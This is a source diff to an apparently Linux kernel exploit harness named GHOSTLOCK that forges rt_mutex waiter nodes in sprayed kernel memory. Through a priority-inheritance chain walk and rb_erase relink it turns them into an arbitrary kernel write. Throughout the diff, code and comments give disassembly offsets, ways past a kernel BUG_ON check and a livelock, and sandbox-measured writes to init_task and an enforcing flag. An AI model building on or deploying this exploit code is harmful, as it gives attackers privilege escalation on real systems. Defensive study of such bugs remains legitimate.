@@ -139,12 +139,46 @@ static int multicast_prep_enabled(void) {
 /* A2 (fixture lock normalisation) stays off: it silences the panic but also
  * removes the rbtree rotation that performs the target write. */
 static int multicast_prep_lock_enabled(void) {
-    static int cached = -1;
-    if (cached < 0) {
-        const char *v = getenv("GHOSTLOCK_MCAST_PREP_LOCK");
-        cached = (v && v[0] == '1' && v[1] == '\0') ? 1 : 0;
+    /* With the use-once lease below every lock is pristine by construction, so
+     * there is nothing to normalise: this stays OFF unless explicitly asked for
+     * (GHOSTLOCK_MCAST_PREP_LOCK=1) or the legacy rotating-slot layout is forced
+     * (GHOSTLOCK_LOCK_ROTATE=1), where the same slot is reused and would
+     * otherwise carry waiters.rb_root/rb_leftmost from the previous walk. */
+    const char *v = getenv("GHOSTLOCK_MCAST_PREP_LOCK");
+    if (v) return !(v[0] == '0' && v[1] == '\0');
+    return getenv("GHOSTLOCK_LOCK_ROTATE") != nullptr;
+}
+
+/* One walk = one lock.
+ *
+ * rt_mutex_enqueue() -> rb_add_cached() leaves the lock it was called on with
+ * waiters.rb_root == waiters.rb_leftmost == &waiter->tree_entry.  A second walk
+ * on that same lock then takes the inlined rb_next() path
+ * (0x9c3e640 cmp x8,x28 -> 0x9c3e65c ldr x10,[x8,#8] -> deref) and dies, which
+ * is exactly the measured BUG at rtmutex_common.h:118 plus the self-referential
+ * rb_leftmost.  So the address handed to the walk as waiter->lock must be a
+ * pristine, EMPTY rt_mutex_base{wait_lock@0x00, waiters@0x08, owner@0x18} every
+ * single time: non-overlapping 0x20-byte slots carved out of the fixture page,
+ * each used once.  The slot table in the profile (0x80 + i*8, stride 8) both
+ * overlapped (a walk's rb_root/rb_leftmost land on the next slot's fields) and
+ * only had 12 entries, so it corrupted itself after two or three walks.
+ *
+ * The harness restarts the guest between rounds and clear_bss() zeroes the
+ * fixture page again, so no re-zeroing is needed inside a round.
+ * GHOSTLOCK_LOCK_ROTATE=1 keeps the legacy overlapping table for A/B. */
+static uintptr_t multicast_lock_lease(MulticastWaiterRouteContext *context) {
+    if (getenv("GHOSTLOCK_LOCK_ROTATE")) {
+        const size_t n = context->layout.lock_slot_count
+                ? context->layout.lock_slot_count : 1;
+        return context->lock + context->layout.lock_slots_offset +
+                ((size_t) context->lock_slot++ % n) * context->layout.lock_slot_stride;
     }
-    return cached;
+    size_t slots = (context->task > context->lock)
+            ? (size_t) (context->task - context->lock) / 0x20 : 1;
+    if (slots > 64) slots = 64;
+    if (!slots) slots = 1;
+    const size_t index = (size_t) (context->lock_slot++ % slots);
+    return context->lock + index * 0x20;
 }
 
 /* Ask the worker to stamp the buffer again (it owns the kernel frame). */
@@ -224,6 +258,17 @@ static int multicast_waiter_stamp(MulticastWaiterRouteContext *context,
      * heap-backing it would enter the race window (CPP17 review, retained). */
     __extension__ unsigned char b[size];
     size_t o = context->layout.waiter_offset;
+    /* Fixture audit: the walk takes its lock from waiter->lock (+0x38) only, so
+     * log exactly what is being stamped (first few shots + every store shot). */
+    {
+        static int audit;
+        if (value || audit < 6) {
+            audit++;
+            pr_info("mcast stamp target=%#zx value=%#zx lock=%#zx waiter_off=%zu "
+                    "task=%#zx size=%zu\n",
+                    target, value, lock, o, context->task, size);
+        }
+    }
     memset(b, 0, sizeof(b));
     if (multicast_marker_mode()) {
         for (size_t i = 0; i + 8 <= size; i += 8) {
@@ -236,16 +281,123 @@ static int multicast_waiter_stamp(MulticastWaiterRouteContext *context,
         return multicast_waiter_spray(context, b, size);
     }
     /* Same pure encoder as the one-shot route; the resident also stamps the
-     * erase words at the waiter head. */
-    if (!encode_multicast_waiter(
-            {reinterpret_cast<std::byte *>(b), size},
-            o, context->layout.task_offset, context->layout.lock_offset,
-            context->task, lock)) {
-        return -1;
+     * erase words at the waiter head.
+     *
+     * GHOSTLOCK_KEEP_REAL_IDS=1 skips the task/lock stamp so the frame keeps the
+     * identity the kernel itself wrote when it enqueued the real waiter.  That
+     * identity is exactly what rt_mutex_top_waiter() asserts:
+     *     BUG_ON(w->lock != lock);        kernel/locking/rtmutex_common.h:118
+     * and the write shot reaches it -- measured "kernel BUG at
+     * kernel/locking/rtmutex_common.h:118", pc = walk+0xe50, which disassembles
+     * to the BUG() (brk #0x800) block.  Leaving the real lock/task alone keeps
+     * that check satisfied, so the walk can do a genuine erase/relink on the node
+     * the kernel queued -- which is where the store *(target) = value comes from. */
+    if (!getenv("GHOSTLOCK_KEEP_REAL_IDS")) {
+        if (!encode_multicast_waiter(
+                {reinterpret_cast<std::byte *>(b), size},
+                o, context->layout.task_offset, context->layout.lock_offset,
+                context->task, lock)) {
+            return -1;
+        }
+    }
+    /* The PI walk that sched_setscheduler()/sched_setattr() triggers walks
+     * task->pi_waiters, so the nodes it touches are pi_tree_entry at +0x18 --
+     * NOT tree_entry at +0x00.  Stamping the head left the pi_tree fields at
+     * zero (measured in the QEMU sandbox: +0x18/+0x20/+0x28 all 0), so the walk
+     * never saw our forged links: the erase relink that performs
+     * *(target) = value never ran, and the chain walk spun forever in its
+     * retry loop (soft lockup at _raw_spin_unlock_irq, lr = walk+0x1a8).
+     * GHOSTLOCK_STAMP_HEAD=1 restores the old head placement for A/B. */
+    /* Which shots must NOT enter the update pass, and which must?
+     *
+     * The walk does an atomic CAS on the forged lock:  casa 0 -> 1, [lock]
+     * (rt_mutex.owner, lock+0x00).  It succeeds once; every later replay of the
+     * walk fails it and takes the "cannot take the lock" path -- unlock_irq,
+     * yield, jump back to the top of the function -- forever (measured: pc =
+     * _raw_spin_unlock_irq, lr = rt_mutex_adjust_prio_chain+0x1a8, registers
+     * identical across watchdog reports, i.e. a livelock, not a held lock).
+     * The retry exit test is  waiter->prio (waiter+0x44) == task->prio
+     * (task+0x7c); stamping it equal makes the walk take out_unlock before any
+     * of that, which is exactly what the housekeeping shots need.
+     *
+     * Every housekeeping shot (arming, cleanup, scrub, the three prep shots)
+     * passes value == 0, so they all get the early exit and converge.  Only the
+     * real W1 store has a non-zero word, and that one MUST enter the update pass,
+     * because the store *(target) = value is a by-product of the rb_erase relink
+     * that pass performs on our forged node.  Keying this on target instead of
+     * value left the prep shots unprotected and they livelocked before the write
+     * ever ran (measured).
+     *
+     * GHOSTLOCK_WAITER_PRIO overrides the stamped value;
+     * GHOSTLOCK_WAITER_PRIO_ALWAYS=1 stamps it for the store too (diagnostic). */
+    {
+        const char *pe = getenv("GHOSTLOCK_WAITER_PRIO");
+        const bool always = getenv("GHOSTLOCK_WAITER_PRIO_ALWAYS") != nullptr;
+        if (!value || always) {
+            const unsigned long prio = (pe && *pe) ? strtoul(pe, nullptr, 0) : 120UL;
+            support::put32(b, o + 0x44, (uint32_t) prio);
+        }
     }
     if (target) {
-        support::put64(b, o, (target - 8) & ~(uintptr_t) 3);
-        support::put64(b, o + 8, value);
+        /* tcp6/udp6 carry the whole 0x58-byte waiter (off=+0x20/+0x30), so both
+         * rb heads are ours to write.  The function that BUGs on w->lock != lock
+         * is rt_mutex_top_waiter():
+         *     leftmost = rb_first_cached(&lock->waiters);
+         *     w = rb_entry(leftmost, struct rt_mutex_waiter, tree_entry);
+         *     BUG_ON(w->lock != lock);
+         * i.e. it takes its node from the TREE head at +0x00 (rb_first_cached
+         * returns waiters.rb_leftmost, and rb_entry uses tree_entry), NOT from
+         * the pi head at +0x18 that this route used to stamp.  With the pi-only
+         * placement the node the assert inspects was one the kernel/spray never
+         * wrote, so the identity check could not hold (measured: BUG at
+         * rtmutex_common.h:118, pc = walk+0xe50, via __sched_setscheduler).
+         * Store shots now stamp the erase-left-only shape on the tree head
+         *     { __rb_parent_color = value, rb_right = 0, rb_left = target }
+         * which is the relink that performs *(target) = value, and leave the pi
+         * head empty/self-parented so the pi_waiters traversal stays sane.
+         * GHOSTLOCK_STAMP_HEAD=1 restores the old pi-head-only placement for A/B. */
+        const bool old_head = getenv("GHOSTLOCK_STAMP_HEAD") != nullptr;
+        const size_t node = old_head ? o + 0x18 : o;
+        /* GHOSTLOCK_LEAF_STORE=1 selects the leaf arm on purpose.  Measured
+         * 2026-09-23: with it the store no longer reaches the target at all
+         * (enforcing stayed 01 while the requested word went nowhere), i.e.
+         * rb_right == 0 sends the relink to value+8/value+0x10 instead of to
+         * rb_left.  Default stays on the shape that does land (zero write near
+         * the target) until the pointer-write path is ported properly. */
+        if (!old_head) {
+            /* tree_entry is the node the walk erases (0x9c3e674:
+             * `add x1,x27,#8 ; bl rb_erase`), so its fields decide which arm of
+             * rb_erase runs:
+             *   +0x00 __rb_parent_color = (target-8)&~3   -> parent = target-8
+             *          and != &tree_entry, otherwise RB_EMPTY_NODE() at 0x9c3e634
+             *          skips the whole erase
+             *   +0x08 rb_right           = value, must be non-zero (0 sends it
+             *          into the rebalance path / rb_next deref)
+             *   +0x10 rb_left            = 0 (0x91da3d0 `cbz x9` -> Case 1)
+             * Case 1 then stores *(target) = value -- unless *(target+8) happens
+             * to equal this node, in which case the other branch writes target+8. */
+            support::put64(b, node, (target - 8) & ~(uintptr_t) 3);
+            support::put64(b, node + 8, value);
+            support::put64(b, node + 16, 0);
+        } else if (value && getenv("GHOSTLOCK_LEAF_STORE")) {
+            /* Leaf geometry, matching the erase relink *(rb_left) = pc
+             * (upstream fops.c: relink_left = fake_right ? target : left):
+             *   rb_parent_color := value    (the word to store)
+             *   rb_right        := 0        (selects the leaf arm)
+             *   rb_left         := target   (the destination)
+             * The old shape -- pc = (target-8), rb_right = value, rb_left unset --
+             * selects the one-child arm and stores 0 near the target instead of
+             * the requested word (measured in the QEMU sandbox 2026-09-23:
+             * init_task+0x8 went 0x42f94000 -> 0 while the requested word never
+             * appeared).  Housekeeping shots (value == 0) keep the old shape,
+             * because pc == 0 would leave the node parentless. */
+            support::put64(b, node, value);
+            support::put64(b, node + 8, 0);
+            support::put64(b, node + 16, target);
+        } else {
+            support::put64(b, node, (target - 8) & ~(uintptr_t) 3);
+            support::put64(b, node + 8, value);
+        }
     }
     uint16_t family = AF_UNSPEC;
     memcpy(b + 8, &family, sizeof(family));
@@ -275,10 +427,8 @@ static void *multicast_waiter_worker(void *arg) {
     atomic_store(&context->waiter_ready, 1);
     while (!atomic_load(&context->stop_requested)) {
         if (atomic_exchange(&context->respray_requested, 0)) {
-            uintptr_t lock = context->lock + context->layout.lock_slots_offset +
-                    ((size_t) context->lock_slot++ % context->layout.lock_slot_count) *
-                            context->layout.lock_slot_stride;
-            multicast_waiter_stamp(context, context->target, context->value, lock);
+            multicast_waiter_stamp(context, context->target, context->value,
+                    multicast_lock_lease(context));
             atomic_store(&context->sprayed, 1);
         }
         sched_yield();
@@ -348,12 +498,23 @@ int MulticastWaiterRoute::start() noexcept {
     const struct execution_settings *execution = resident_execution_settings();
     context->init(
             &g_exploit_session.race, nullptr, execution, layout_value, 1);
+    /* Fresh lease table for this round: each walk below takes its own pristine
+     * 0x20-byte lock slot (see multicast_lock_lease). */
+    context->lock_slot = 0;
     context->main_cpu = runtime_config_snapshot().main_cpu;
     context->consumer_cpu = runtime_config_snapshot().consumer_cpu;
     uintptr_t bss = resolved_addresses_data_alias(
             &g_exploit_session.addresses, KIMAGE_TEXT_BASE + layout_value.fake_bss_image_offset);
     context->lock = bss + layout_value.fake_lock_offset;
     context->task = bss + layout_value.fake_task_offset;
+    pr_info("mcast fixture bss=%#zx lock=%#zx task=%#zx fake_bss_off=%#zx "
+            "fake_lock_off=%#zx fake_task_off=%#zx slots_off=%#x count=%u stride=%u\n",
+            bss, context->lock, context->task,
+            (size_t) layout_value.fake_bss_image_offset,
+            (size_t) layout_value.fake_lock_offset,
+            (size_t) layout_value.fake_task_offset,
+            context->layout.lock_slots_offset, context->layout.lock_slot_count,
+            context->layout.lock_slot_stride);
     struct sigaction sa = {};
     sa.sa_handler = multicast_waiter_interrupt;
     sigemptyset(&sa.sa_mask);
@@ -434,18 +595,28 @@ int MulticastWaiterRoute::write(uintptr_t target, uintptr_t value) noexcept {
          * rbtree rotation that produces the target write (measured: ret=0 but
          * "Write 1 failed"). Enable with GHOSTLOCK_MCAST_PREP_LOCK=1 only when
          * deliberately testing the "clean lock" hypothesis. */
-        if (multicast_prep_lock_enabled() && context->layout.lock_slot_count) {
-            const size_t n = context->layout.lock_slot_count;
-            const size_t used = (context->lock_slot + n - 1) % n;
-            const uintptr_t slot = context->lock + context->layout.lock_slots_offset +
-                    used * context->layout.lock_slot_stride;
+        if (multicast_prep_lock_enabled()) {
+            /* Normalise the fixture lock into the EMPTY valid rt_mutex_base the
+             * walk needs before it erases our node:
+             *   wait_lock(0) / waiters.rb_node(0) / rb_leftmost(0) / owner(0).
+             * Each of these is one housekeeping shot (value == 0 -> the walk
+             * takes the prio-equal early exit, so it only performs the store). */
             static const unsigned kLockFields[] = {0x0u, 0x8u, 0x10u, 0x18u};
-            for (size_t i = 0; i < sizeof(kLockFields) / sizeof(kLockFields[0]); i++) {
-                const uintptr_t addr = slot + kLockFields[i];
-                multicast_request_respray(context, addr, 0);
-                usleep(multicast_post_spray_settle_us());
-                long rr = multicast_waiter_adjust(context);
-                pr_info("mcast prep lock: [%#zx] <- 0 ret=%ld\n", addr, rr);
+            const size_t slots = (getenv("GHOSTLOCK_LOCK_ROTATE") &&
+                    context->layout.lock_slot_count)
+                    ? context->layout.lock_slot_count : 1;
+            for (size_t s = 0; s < slots; s++) {
+                const uintptr_t slot = getenv("GHOSTLOCK_LOCK_ROTATE")
+                        ? context->lock + context->layout.lock_slots_offset +
+                                s * context->layout.lock_slot_stride
+                        : context->lock;
+                for (size_t i = 0; i < sizeof(kLockFields) / sizeof(kLockFields[0]); i++) {
+                    const uintptr_t addr = slot + kLockFields[i];
+                    multicast_request_respray(context, addr, 0);
+                    usleep(multicast_post_spray_settle_us());
+                    long rr = multicast_waiter_adjust(context);
+                    pr_info("mcast prep lock: [%#zx] <- 0 ret=%ld\n", addr, rr);
+                }
             }
         }
         /* leave the window benign again before the real write */
